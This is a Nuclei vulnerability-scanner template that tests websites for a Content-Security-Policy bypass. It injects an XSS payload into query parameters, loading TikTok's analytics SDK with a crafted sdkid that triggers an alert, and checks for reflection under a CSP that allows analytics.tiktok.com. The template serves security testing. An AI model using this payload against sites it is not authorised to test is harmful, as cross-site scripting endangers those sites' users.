id: tiktok-analytics-csp-xss

info:
  name: Content-Security-Policy Bypass via TikTok Analytics
  author: DhiyaneshDK
  severity: high
  reference:
    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L11C22-L11C115
  metadata:
    verified: true
  tags: xss,csp-bypass,tiktok

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://analytics.tiktok.com/i18n/pixel/sdk.js?sdkid=%22-alert`1`-%22"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: word
        part: content_security_policy
        words:
          - "analytics.tiktok.com"
          - "script-src"
        condition: and